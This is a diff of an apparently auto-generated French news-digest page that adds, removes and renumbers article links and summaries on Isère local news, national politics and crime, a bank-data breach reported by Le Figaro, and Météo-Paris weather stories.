 Alors que la Foire des Rameaux revient ce week-end à Grenoble, nous faisons une dernière plongée dans nos archives. On remonte le temps jusque dans les années 1980 avec un forain qui menace de s'immoler par le feu et Alain Carignon qui fait du toboggan. Retour en images.
 
@@ -2908,7 +2910,7 @@ Alors que la Foire des Rameaux revient ce week-end à Grenoble, nous faisons une
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 15. `FR` [Nord-Isère. Deux blessés dans une collision à Sainte-Blandine](data/articles/17c67ea2d75595d17eaef94fb226eff3.html)
+### 14. `FR` [Nord-Isère. Deux blessés dans une collision à Sainte-Blandine](data/articles/17c67ea2d75595d17eaef94fb226eff3.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 L’accident est survenu à 16 h 45, ce mercredi 18 février, route de Saint-Victor-de-Cessieu à Sainte-Blandine.
 
@@ -2916,7 +2918,7 @@ L’accident est survenu à 16 h 45, ce mercredi 18 février, route de Saint-
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 16. `FR` [Vienne. 12e édition du Chocoshow](data/articles/787417737add51a831cdab8dc906529b.html)
+### 15. `FR` [Vienne. 12e édition du Chocoshow](data/articles/787417737add51a831cdab8dc906529b.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 Le Chocoshow fait son retour le vendredi 27 février pour une 12e édition.
 
@@ -2924,7 +2926,7 @@ Le Chocoshow fait son retour le vendredi 27 février pour une 12e édition.
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 17. `FR` [Voiron. « À 11 heures, je n’ai plus aucun oeuf » : sur le marché, la pénurie des uns fait le bonheur des autres](data/articles/aba297e300dd9227ffee52895e2581f2.html)
+### 16. `FR` [Voiron. « À 11 heures, je n’ai plus aucun oeuf » : sur le marché, la pénurie des uns fait le bonheur des autres](data/articles/aba297e300dd9227ffee52895e2581f2.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 Alors que la France fait face à des pénuries d’œufs dans les grandes surfaces, sur le marché de Voiron, les producteurs et les revendeurs tirent leur épingle du jeu.
 
@@ -2932,7 +2934,7 @@ Alors que la France fait face à des pénuries d’œufs dans les grandes surfac
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 18. `FR` [JO d'hiver 2026. Choix des formats, réticence de certains... Les dessous de l'arrivée du ski-alpinisme à Milan-Cortina](data/articles/bc2cc4c5b3d3d0c47db6d5165b0fa3d1.html)
+### 17. `FR` [JO d'hiver 2026. Choix des formats, réticence de certains... Les dessous de l'arrivée du ski-alpinisme à Milan-Cortina](data/articles/bc2cc4c5b3d3d0c47db6d5165b0fa3d1.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 Après une longue attente, le ski-alpinisme va enfin faire ses débuts aux JO, en cette fin de semaine à Bormio.
 
@@ -2940,7 +2942,7 @@ Après une longue attente, le ski-alpinisme va enfin faire ses débuts aux JO, e
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 19. `FR` [Bourgoin-Jallieu. Un ado interpellé après un refus d’obtempérer, deux autres en fuite](data/articles/908b8e85396db287458ad1e6d603eaa2.html)
+### 18. `FR` [Bourgoin-Jallieu. Un ado interpellé après un refus d’obtempérer, deux autres en fuite](data/articles/908b8e85396db287458ad1e6d603eaa2.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 La petite équipe recherchait probablement à siphonner des réservoirs ou à dérober une voiture.
 
@@ -2948,7 +2950,7 @@ La petite équipe recherchait probablement à siphonner des réservoirs ou à d�
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 20. `FR` [Isère. Suspectée d’avoir porté un coup de couteau à son compagnon et placée en détention provisoire](data/articles/2bbcea17ab4927eaf1a00aba2d439df4.html)
+### 19. `FR` [Isère. Suspectée d’avoir porté un coup de couteau à son compagnon et placée en détention provisoire](data/articles/2bbcea17ab4927eaf1a00aba2d439df4.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 Une femme de 41 ans suspectée d’avoir blessé son compagnon d’un coup de couteau a été interpellée dans la nuit de samedi à dimanche dans un hôtel de Montbonnot-Saint-Martin. Elle a été placée en détention provisoire dans l’attente de son procès prévu le 27 avril.
 
@@ -2956,15 +2958,31 @@ Une femme de 41 ans suspectée d’avoir blessé son compagnon d’un coup de co
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 21. `FR` [JO d'hiver 2026 - Ski de fond. Une double casse de bâtons qui gâche tout : quand la malchance fait perdre les Bleus sur le sprint par équipes](data/articles/692742a4ffc914d613adededf32fde71.html)
+### 20. `FR` [JO d'hiver 2026 - Ski de fond. Une double casse de bâtons qui gâche tout : quand la malchance fait perdre les Bleus sur le sprint par équipes](data/articles/692742a4ffc914d613adededf32fde71.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 Le duo Desloges-Chappaz n’a jamais pu jouer sa chance à fond, retardé par une double casse de bâtons sur le sprint par équipes. Frustrant !
 
 </div>
 
+<div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
+
+### 21. `FR` [Bizonnes | Longechenal | Flachères. Une vente de diots ce dimanche](data/articles/31c3181a21d85f97cc212f6e273e85d9.html)
+**Source:** Le Dauphiné Isère | **Keyword:** `Local`
+L’Amicale des quatre villages du Liers, qui rassemble les communes de Bizonnes, Flachères, Longechenal et Le Mottier, organise une vente de diots le dimanche 22 février.
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
+
+### 22. `FR` [La Verpillière. Municipales : réunion publique d’Emmanuel Damato ce vendredi](data/articles/31bee610f6a67a42bd9c1f9883eb6fb3.html)
+**Source:** Le Dauphiné Isère | **Keyword:** `Local`
+En vue des élections municipales des 15 et 22 mars, Emmanuel Damato tiendra une réunion publique ce vendredi 20 février à 19 h au Centre communal d’action sociale (CCAS) de La Verpillière.
+
+</div>
+
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Monde">
 
-### 22. `FR` [Municipales à Grenoble : le retour d’Alain Carignon tend la campagne](data/articles/4a192b8f6ff269d862068623d2ca8d82.html)
+### 23. `FR` [Municipales à Grenoble : le retour d’Alain Carignon tend la campagne](data/articles/4a192b8f6ff269d862068623d2ca8d82.html)
 **Source:** Le Monde | **Keyword:** `Local`
 Laurence Ruffin, la candidate de la gauche soutenue par le maire sortant écologiste Eric Piolle, fait campagne autour de la jeunesse, de la solidarité et de la culture dans une ville marquée par une insécurité croissante.
 
@@ -2972,7 +2990,7 @@ Laurence Ruffin, la candidate de la gauche soutenue par le maire sortant écolog
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 23. `FR` [Rugby. Nationale : deux clubs en grand danger, quelles conséquences pour le SO Chambéry et le CSBJ ?](data/articles/1a7fbbe9a22ef1cf306fa1de5e3a5466.html)
+### 24. `FR` [Rugby. Nationale : deux clubs en grand danger, quelles conséquences pour le SO Chambéry et le CSBJ ?](data/articles/1a7fbbe9a22ef1cf306fa1de5e3a5466.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 Deux clubs sont en danger en troisième division : Tarbes est au bord du dépôt de bilan, tandis que Bourg-en-Bresse est rétrogradé en Nationale 2, sous réserve d’un appel. Pour le CSBJ et Chambéry, les conséquences sont directes.
 
@@ -2980,17 +2998,9 @@ Deux clubs sont en danger en troisième division : Tarbes est au bord du dépô
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 24. `FR` [Montagne. Alerte orange et risque maximum d’avalanches sur les massifs isérois](data/articles/7e12ed67238d9ad3974b94ac88e083d6.html)
+### 25. `FR` [Montagne. Alerte orange et risque maximum d’avalanches sur les massifs isérois](data/articles/7e12ed67238d9ad3974b94ac88e083d6.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 De très fortes chutes de neige sont de nouveau attendues dans la nuit de mercredi à jeudi et durant la journée de jeudi sur les massifs isérois (40 à 70 cm de neige fraîche attendus dès 1 100 m, soit 40 cm en station et 70 cm en altitude).
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
-
-### 25. `FR` [Isère. Quand la mascotte des Jeux d’hiver 1992 était… voironnaise](data/articles/dbd3e11b89cf0f62f4353061761b2eb6.html)
-**Source:** Le Dauphiné Isère | **Keyword:** `Local`
-Vous souvenez-vous de Magique, la mascotte des Jeux d’hiver de 1992 à Albertville ? Alors que l’édition milanaise de la quinzaine olympique se refermera ce dimanche 22 février, retour sur l’aventure derrière cette étoile bleu et rouge qui fut fabriquée et distribuée par l’entreprise voironnaise Gueydon, aujourd’hui connue sous le nom de King Jouet.
 
 </div>
 
@@ -3146,9 +3156,17 @@ Ce mercredi (14h45), le GF38 (Ligue 2) reçoit Monaco en Coupe de France.
 
 ## France News / Journaux France
 
+<div class="article-item" data-lang="fr" data-category="france" data-source="Le Figaro">
+
+### 1. `FR` [IBAN, adresse, identifiant fiscal : que peuvent faire les escrocs avec vos données et comment se protéger ?](data/articles/9e3213a57a302db7b3a539ca6ddd9d77.html)
+**Source:** Le Figaro | **Keyword:** `Actualites`
+DÉCRYPTAGE - L’intrusion révélée mercredi dans le fichier national des comptes bancaires expose 1,2 million de personnes, selon Bercy. Les risques concrets et les façons de s’en prémunir.
+
+</div>
+
 <div class="article-item" data-lang="fr" data-category="france" data-source="Ouest-France">
 
-### 1. `FR` [Mort de Quentin Deranque : assistants parlementaires, gardes à vue prolongées… Ce que l’on sait des 11 suspects arrêtés](data/articles/4492bbd397c8c3019df065f61b23f43b.html)
+### 2. `FR` [Mort de Quentin Deranque : assistants parlementaires, gardes à vue prolongées… Ce que l’on sait des 11 suspects arrêtés](data/articles/4492bbd397c8c3019df065f61b23f43b.html)
 **Source:** Ouest-France | **Keyword:** `Actualites`
 Depuis le décès du militant nationaliste à Lyon, l’enquête se resserre autour d’une dizaine de suspects, hommes et femmes, qui auraient pour certains participé directement aux violences de jeudi, quand d’autres sont soupçonnés d’avoir contribué à leur fuite.
 
@@ -3156,7 +3174,7 @@ Depuis le décès du militant nationaliste à Lyon, l’enquête se resserre aut
 
 <div class="article-item" data-lang="fr" data-category="france" data-source="Franceinfo">
 
-### 2. `FR` [Collaborateurs parlementaires, fichés S… Ce que l'on sait des 11 interpellations après la mort du militant identitaire Quentin Deranque à Lyon](data/articles/8501f061a39dbccfedad9184840977f7.html)
+### 3. `FR` [Collaborateurs parlementaires, fichés S… Ce que l'on sait des 11 interpellations après la mort du militant identitaire Quentin Deranque à Lyon](data/articles/8501f061a39dbccfedad9184840977f7.html)
 **Source:** Franceinfo | **Keyword:** `Actualites`
 Huit hommes et trois femmes, soupçonnés d'être impliqués à des degrés divers dans la mort du militant nationaliste, ont été placés en garde à vue mardi et mercredi.
 
@@ -3164,17 +3182,9 @@ Huit hommes et trois femmes, soupçonnés d'être impliqués à des degrés di
 
 <div class="article-item" data-lang="fr" data-category="france" data-source="Ouest-France">
 
-### 3. `FR` [Mort de Quentin à Lyon : Jeune garde, extrême-droite... « La tension est de plus en plus vive », analyse un historien](data/articles/64d4ea6278b2ee2dd8d5740a97b53a40.html)
+### 4. `FR` [Mort de Quentin à Lyon : Jeune garde, extrême-droite... « La tension est de plus en plus vive », analyse un historien](data/articles/64d4ea6278b2ee2dd8d5740a97b53a40.html)
 **Source:** Ouest-France | **Keyword:** `Actualites`
 Mardi 17 et mercredi 18 février 2026, des membres de la Jeune garde ont été interpellés dans une enquête ouverte à Lyon pour homicide volontaire. Fondée en 2018, notamment par le député La France insoumise Raphaël Arnault, l’organisation antifasciste est accusée par des ministres d’être responsable de la mort de Quentin Deranque, un militant nationaliste, le week-end dernier. Zoom sur ce mouvement qui fait aussi l’objet d’une demande de dissolution du ministère de l’Intérieur.
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="france" data-source="Ouest-France">
-
-### 4. `FR` [Coupe du monde 2026. Les stades seront pleins assure Infantino](data/articles/56758cd14f121c4140ef88c232f048cd.html)
-**Source:** Ouest-France | **Keyword:** `Actualites`
-Le patron de la Fédération internationale de football (Fifa) a assuré que tous les matches de la Coupe du monde de football, qui se déroule aux États-Unis, au Canada et au Mexique, se tiendront à guichets fermés, alors que le prix des places a fait beaucoup débat.
 
 </div>
 
@@ -3202,9 +3212,17 @@ DÉCRYPTAGE - Deux collaborateurs parlementaires de l’élu du Vaucluse ont ét
 
 </div>
 
+<div class="article-item" data-lang="fr" data-category="france" data-source="Le Figaro">
+
+### 8. `FR` [Les données de plus d’un million de comptes bancaires consultées de manière «illégitime» par «un acteur malveillant»](data/articles/e774c0bc6ddff0b34c19484af1b81e3c.html)
+**Source:** Le Figaro | **Keyword:** `Actualites`
+«À compter de la fin janvier 2026, un acteur malveillant (...) a pu consulter une partie» du fichier national des comptes bancaires, avertit Bercy.
+
+</div>
+
 <div class="article-item" data-lang="fr" data-category="france" data-source="Franceinfo">
 
-### 8. `FR` [Prisons : les suicides de détenus "surreprésentés" par rapport à la population générale française, selon l'Observatoire international des prisons](data/articles/dea0a90c6ab70ab817ef137bca945016.html)
+### 9. `FR` [Prisons : les suicides de détenus "surreprésentés" par rapport à la population générale française, selon l'Observatoire international des prisons](data/articles/dea0a90c6ab70ab817ef137bca945016.html)
 **Source:** Franceinfo | **Keyword:** `Actualites`
 "C'est plutôt sur l'accompagnement au long cours et la détection de situations de fragilité que l'administration pèche aujourd'hui", juge le président de l'observatoire, Matthieu Quinquis, mercredi sur France Inter.
 
@@ -3212,7 +3230,7 @@ DÉCRYPTAGE - Deux collaborateurs parlementaires de l’élu du Vaucluse ont ét
 
 <div class="article-item" data-lang="fr" data-category="france" data-source="Franceinfo">
 
-### 9. `FR` [Les députés RN Laurent Jacobelli et Frédéric-Pierre Vos et le LFI Antoine Léaument sanctionnés pour leur comportement à l'Assemblée nationale](data/articles/405b9204867da9b9a4af06b4a6e4ee29.html)
+### 10. `FR` [Les députés RN Laurent Jacobelli et Frédéric-Pierre Vos et le LFI Antoine Léaument sanctionnés pour leur comportement à l'Assemblée nationale](data/articles/405b9204867da9b9a4af06b4a6e4ee29.html)
 **Source:** Franceinfo | **Keyword:** `Actualites`
 Les deux élus du Rassemblement national et le député de La France insoumise ont été épinglés mercredi par le bureau de l'Assemblée nationale.
 
@@ -3220,7 +3238,7 @@ Les deux élus du Rassemblement national et le député de La France insoumise o
 
 <div class="article-item" data-lang="fr" data-category="france" data-source="Franceinfo">
 
-### 10. `FR` [Le siège national de La France insoumise à Paris brièvement évacué après "une menace à la bombe", annonce Manuel Bompard](data/articles/74e2632e9717274c9f9af1303820ed64.html)
+### 11. `FR` [Le siège national de La France insoumise à Paris brièvement évacué après "une menace à la bombe", annonce Manuel Bompard](data/articles/74e2632e9717274c9f9af1303820ed64.html)
 **Source:** Franceinfo | **Keyword:** `Actualites`
 Les services de police se sont rendus sur place et l'ensemble des militants et des salariés a été évacué. Ils ont pu retourner dans le bâtiment après "la levée de doute" a précisé le coordinateur de LFI.
 
@@ -3228,9 +3246,9 @@ Les services de police se sont rendus sur place et l'ensemble des militants et d
 
 <div class="article-item" data-lang="fr" data-category="france" data-source="Le Figaro">
 
-### 11. `FR` [Le député insoumis et fondateur de la Jeune Garde Raphaël Arnault doit-il cesser de siéger à l'Assemblée nationale ?](data/articles/1dd065a5728cd6c351d067de13a19745.html)
+### 12. `FR` [Le député insoumis et fondateur de la Jeune Garde Raphaël Arnault doit-il cesser de siéger à l'Assemblée nationale ?](data/articles/1dd065a5728cd6c351d067de13a19745.html)
 **Source:** Le Figaro | **Keyword:** `Actualites`
-Mort de Quentin Deranque : Raphaël Glucksmann tente une échappée anti-LFI, silence gêné du reste de la gauche RÉCIT - Si l’eurodéputé a jugé « impensable » que son camp « cultive le moindre doute » sur une « possible alliance » avec Jean-Luc Mélenchon à l’avenir, le PS, dont il est proche, ne s’est pas exprimé lundi.
+Et pourtant, la é personnalisée est un moyen de soutenir le travail de notre rédaction qui s’engage à vous proposer chaque jour une information de qualité. En acceptant les cookies, vous pourrez accéder aux contenus et fonctionnalités gratuites que propose notre site.À tout moment, vous pouvez modifier vos choix via le bouton “paramétrer les cookies” en bas de page.
 
 </div>
 
@@ -3252,15 +3270,7 @@ Miyazaki, extrême sud du Japon, sous la neige ce week-end - Image d'illustratio
 
 <div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
 
-### 2. `FR` [En pleine guerre, l'Ukraine souffre d'un hiver très froid](data/articles/cb0e8862d419270f45c798d281322595.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-Alors que la guerre se poursuit, l'Ukraine fait face à un hiver très rigoureux. Le thermomètre chute jusqu'à -20°C à Kiev où les coupures d'électricité répétée empêchent les habitants de se chauffer et mettent la population à rude épreuve. Image améliorée par IA. L'Ukraine plongée dans un froid mordant depuis Noël Alors que les trois premières semaines du mois de décembre 2025 avaient été douces et clémentes, le froid est arrivé brutalement sur l'Ukraine lors des fêtes de Noël. Depuis, il n'y a eu aucun redoux. À Kiev, la température la plus élevée mesurée entre Noël et ce 10 février 2026 fut de +1°C. Au mois de janvier 2026, la capitale ukrainienne a enregistré une température moyenne de -10°C le matin et -5°C l'après-midi. 18 nuits ont franchi le seuil des -10°C, alors que la normale est de -5°C. Avec un déficit de -4°C sur 31 jours, Kiev a connu son mois de janvier le plus froid depuis 2010 ! Températures minimales et maximales mesurées à Kiev (Ukraine) au mois de janvier 2026 - infoclimat.fr La situation ne s'arrange pas en ce mois de février, bien au contraire ! Les 10 premiers jours du mois ont été particulièrement froids à Kiev avec une moyenne de -14°C durant les nuits et de -7°C les après-midi ! 5 des 10 premières nuits du mois ont enregistré des températures inférieures à -15°C ! D'ailleurs, cette nuit du 10 février 2026 fut bien souvent la plus froide de l'hiver. Kiev a franchi la barre des -20°C pour la première fois avec une minimale de -20,2°C ! Dans le nord du pays, on a mesuré jusqu'à -28,2°C à Tchernihiv, ville peuplée de plus de 280.000 habitants. Températures minimales mesurées en Ukraine ce mardi 10 février 2026 - carte ogimet La guerre rend le froid beaucoup plus difficile Pour les soldats engagés sur le front, ce froid rend les conditions de vie particulièrement rudes. Toutefois, l'ensemble de la population est affectée. Comme la Russie attaque les infrastructures énergétiques, les coupures d'électricité sont très nombreuses. Actuellement, la capitale Kiev ne profite que d'environ deux heures d'électricité par jour. Autant dire que le chauffage ne peut pas être utilisé efficacement et que le froid pénètre dans les habitations, plongées dans le noir durant de nombreuses heures la nuit. Kiev (Ukraine) privée d'électricité au cours d'un hiver particulièrement froid - photo Sergey Dolzhenko La Russie tire profit de cet hiver rude. Ces dernières semaines, toutes les infrastructures énergétiques d'Ukraine ont été attaquées afin de mettre à mal l'accès à l'électricité dans le pays. L'objectif étant d'épuiser la population en la surexposant aux températures excessivement basses. En ce mois de février 2026, les autorités indiquent que les prochains jours resteront très difficiles en raison du déficit électrique très important, lié à l'arrêt de nombreuses centrales ayant été endommagées. Les rues de Kiev (Ukraine) sous la neige durant le mois de janvier 2026 - photo Sergej Sumlenny À lire également : &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; Menace de tempête sur la moitié sud pour jeudi &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 3. `FR` [Jusqu'à 60 cm de neige sur la Côte d'Azur à la fin du mois de février !](data/articles/ac45386eb93746ec0b8e7faa9f110330.html)
+### 2. `FR` [Jusqu'à 60 cm de neige sur la Côte d'Azur à la fin du mois de février !](data/articles/ac45386eb93746ec0b8e7faa9f110330.html)
 **Source:** Météo-Paris | **Keyword:** `Local`
 L’hiver le plus implacable du XXᵉ siècle Deux ans après le traumatisme de février 1954, la France replonge dans l’hiver le plus implacable du XXᵉ siècle. Février 1956 s’annonce d’une brutalité inédite. Tout commence le 30 janvier : en moins de quarante-huit heures, les températures s’effondrent de 20 à 25 °C. Le choc est violent, meurtrier. Une quarantaine de personnes perdent la vie dès les premiers jours. Le froid s’installe, s’étend, s’obstine. Il ne desserre son étau que le 28 février, après avoir paralysé l’ensemble du pays et une grande partie de l’Europe. À Paris, la température moyenne du mois chute à - 4,2 °C, un niveau digne d’un mois de février à Oslo. Jamais le XXᵉ siècle n’a connu pareil froid. Les sols, gorgés d’eau, durcissent comme du béton. Les cultures d’hiver — avoine, blé, colza — sont ravagées. Dans de nombreuses régions, les champs devront être entièrement réensemencés au printemps. Pour les agriculteurs, la facture est colossale. Des températures historiques dans le Sud Dans le sud, l’épisode prend une dimension historique. Février 1956 devient le mois le plus froid jamais observé depuis le début des relevés, peut-être même depuis les hivers mythiques de 1709 ou 1684. ` Le 2 février, l’air glacial s’engouffre dans la vallée du Rhône et déclenche un mistral d’une violence extrême : des rafales atteignent 180 km/h à Istres, 160 km/h à Orange avec un ressenti de -30, compte tenu des températures extrêmement basses au thermomètre . La presqu’île de Saint-Tropez se retrouve coupée du monde. La neige s’accumule, jusqu’à 60 centimètres, formant des congères de plus de trois mètres. Sur la Côte d’Azur, le décor est surréaliste. À Saint-Raphaël et Antibes, le poids de la neige écrase les serres, ruine les cultures florales et maraîchères. Les dégâts dépassent les 600 millions de francs. La neige tient jusqu’au 15 mars. Dans le sud de la vallée du Rhône, près de 800 000 oliviers sont détruits, certains gelés jusqu’à la racine. Les indemnisations, elles, se feront attendre pendant des années. L’aéroport de Nice ferme à plusieurs reprises. Winston Churchill, bloqué cinq heures sur place, finit par regagner Londres. Le Carnaval de Nice est interrompu par la neige. À Cannes, où l’on mesure jusqu’à 50 centimètres au sol, la fête des mimosas est annulée. Orangers et citronniers sont décimés, certaines plantations disparaissent à jamais, comme celles de la vallée du Loup, près de Grasse. Le littoral de la Côte d'Azur coupé du monde, après la tempête de neige du 1er février 1956 - archives meteo-paris.com Même le Rhône et certains ports gèlent partiellement !! Un léger redoux autour du 5 février laisse espérer une accalmie. Illusion. Dès le 7, le froid sibérien revient avec une intensité redoublée et ne lâche plus prise jusqu’à la fin du mois. La France vit alors au rythme d’un pays du Grand Nord. Les rivières gèlent, les ports se figent. À Tarascon, un bras du Rhône est pris par la glace sur trois kilomètres. Près de Marseille, l’étang de Berre se solidifie à son tour, tout comme un bassin du Vieux-Port à partir de la mi-février. À Paris, le lac du Bois de Boulogne devient une patinoire improvisée où l’on organise un match de hockey sur glace. À Saint-Fargeau, près de Melun, des centaines de curieux viennent chaque jour observer la Seine entièrement gelée. La Saône totalement gelée à 20 km au nord de Lyon en février 1956 - archives meteo-paris.com Jusqu'à -32°C à Sarreguemines ! Les records de froid tombent les uns après les autres : –12 °C à Saint-Raphaël, –17 °C à Marseille et Paris, –21 °C à Lyon, –25 °C à Nancy, jusqu’à –32 °C à Sarreguemines. À Strasbourg, 160 aiguillages ferroviaires gèlent, paralysant une grande partie du trafic. Températures minimales en février 1956 - carte meteo-villes.com 80 cm de neige dans les rues de Bordeaux ! Le 21 février, une tempête de neige isole l’Aquitaine. À Bordeaux, on mesure jusqu’à 80 centimètres dans les rues. L’armée est appelée en renfort. Usines, écoles, grands magasins ferment. La radio devient le principal lien avec l’extérieur. Le maire, Jacques Chaban-Delmas, bloqué à Paris, dirige la gestion de crise à distance pour assurer en priorité l’approvisionnement en pain et en lait. Les congères dépassent deux mètres dans certaines zones de Gironde, notamment vers Arcachon. Sur le littoral, le gel provoque un désastre. Les parcs ostréicoles d’Oléron sont détruits. La mer gèle sur près d’un kilomètre. À l’île de Ré, la misère s’installe : trois cents pêcheurs de pétoncles, venus de Noirmoutier, se retrouvent piégés, affamés, transis. Les enfants mangent des pommes de terre gelées. En Corse aussi, la neige bloque des villes du littoral. À Ajaccio, les denrées sont rationnées : cinquante kilos de pommes de terre par épicier. Les vignobles français, y compris en Alsace, enregistrent des pertes pouvant atteindre 50 %. Le centre de Bordeaux totalement bloqué sous 80 cm de neige... photo exclusive meteo-paris.com La vague de froid ne s’arrête pas aux frontières. Elle gagne l’Afrique du Nord. Les côtes hollandaises gèlent. Des pêcheurs restent prisonniers des glaces pendant quatre jours. À Hambourg, les cargos attendent des semaines avant de pouvoir quitter le port. La Baltique se transforme en barrière de glace, isolant la Suède. En Italie, la neige tombe sans discontinuer pendant cent heures sur certaines régions. Des centaines de villages sont coupés du monde. Près de Naples, 40 centimètres de neige recouvrent les rues, tandis que des chômeurs affamés manifestent dans le sud. À la fin du mois, les stocks de charbon sont au plus bas. Les États-Unis envoient en urgence 140 000 tonnes. Les services des ponts et chaussées redoutent désormais le dégel. Sur la Seine, d’énormes blocs de glace menacent les ouvrages. Le vieux pont de Sainte-Assise est condamné, incapable de résister aux « icebergs » charriés par le fleuve. D’autres ponts subissent le même sort. Le bilan est terrible : près de 12 000 morts en France. Et tandis que la presse commence à proposer des prévisions météorologiques de plus en plus détaillées, le pays accuse encore un retard sur l’Angleterre, où un bulletin météo complet est déjà accessible par téléphone… au prix d’un simple appel ordinaire. A lire également &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; -40 au vent à Marseille et Dunkerque bloqué par la banquise : c'est possible ! &gt;&gt;&gt; Février 1991 : 15 cm de neige en Bretagne, 10 cm à Cannes, -12°C à Paris... &gt;&gt;&gt; Février 1956 : la pire vague de froid du XXème siècle en France ! Auteur : Guillaume Séchet
 
@@ -3268,95 +3278,7 @@ L’hiver le plus implacable du XXᵉ siècle Deux ans après le traumatisme de 
 
 <div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
 
-### 4. `FR` [1 mort et de gros dégâts : la tempête Nils a frappé fort !](data/articles/26840bf4bdb49b2e35e8c901b9fd934b.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-Voiture écrasée par un arbre à Perpignan au passage de la tempête Nils ce jeudi 12 février 2026 - photo Arpy Cod La tempête Nils a frappé encore plus durement que prévu dans le sud-ouest de la France et jusqu'en Méditerranée. On a mesuré jusqu'à 180 km/h dans les Pyrénées-Orientales et une personne a perdu la vie dans les Landes. Jusqu'à 180 km/h : Nils encore plus forte que prévu ! Les services de Météo France avait anticipé la virulente de la tempête Nils, plaçant la Vendée et de nombreux départements du sud-ouest de la France ainsi que la Corse en vigilance orange tempête. Le département de l'Aude avait été placé en vigilance ROUGE dès mercredi après-midi. À la vue des rafales de vent encore plus importantes que prévu, l'alerte rouge a été étendue aux départements des Pyrénées-Orientales jeudi matin. Carte de vigilance en vigueur le matin du jeudi 12 février 2026 - Météo France Et pour cause, les rafales de vent enregistrées au passage de la tempête Nils ont dépassé la prévision ! Dans la nuit, le sud-ouest a subi des rafales remarquables avec 157 km/h au Cap Ferret sur le littoral aquitain ! Ces vents très violents ne se sont pas limités à la côte. Dans les terres, on a mesuré 132 km/h à Toulouse, 134 km/h à Tarbes, 136 km/h à Mont-de-Marsan et 145 km/h à Pau ! Le matin, Aude et Pyrénées-Orientales ont subi des vents remarquables avec 149 km/h à Perpignan, 158 km/h à Leucate et même jusqu'à 180 km/h à Caixas ! Bien souvent, il s'agit de la plus forte tempête dans ces régions depuis Klaus en 2009 ! La Corse fut aussi fortement affectée jusqu'à 185 km/h à Cagnano dans le Cap Corse ! Rafales maximales de la tempête Nils le jeudi 12 février 2026 - keraunos.org 1 victime et de gros dégâts Les vents particulièrement puissants ont causé de très nombreuses chutes d'arbres dans tout le sud-ouest de la France et près de la Méditerranée. De plus, les sols gorgés en eau ont rendu le déracinement des arbres plus aisé. En matinée du jeudi 12 février 2026, la circulation a été fortement perturbée sur de nombreux axes routiers, y compris sur l'A9 où plusieurs pins sont tombés sur les voies. Un poids lourd a percuté l'un d'eux, blessant légèrement son chauffeur. Plus tôt dans la nuit, un routier de 55 ans a perdu la vie dans les Landes, touché par la chute d'un arbre traversant son pare-brise. Poids lourd ayant percuté un pin tombé sur l'A9 à Lespignan (34) le matin du jeudi 12 février 2026 - photo SDIS34 L'intensité de cette tempête a surpris autant les habitants que les météorologues avec des rafales un ou deux crans au dessus des valeurs initialement prévues. Les chutes d'arbres se comptent par milliers dans le sud-ouest de la France, y compris dans les grandes villes. Celles-ci ont occasionné de très nombreuses pannes d'électricité. En matinée du jeudi 12 février 2026, jusqu'à 900.000 foyers étaient privés d'électricité ! Arbre abattu par la tempête Nils à Salses-le-Château (66) ce jeudi 12 février 2026 - photo Jean-Sébastien Gantou À lire également : &gt;&gt;&gt; La neige revient jusqu'en Ile-de-France, ce week-end ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 5. `FR` [La neige revient jusqu'en Ile-de-France, ce week-end !](data/articles/a4a4a756dfd4ed5bf2782742c58c0633.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
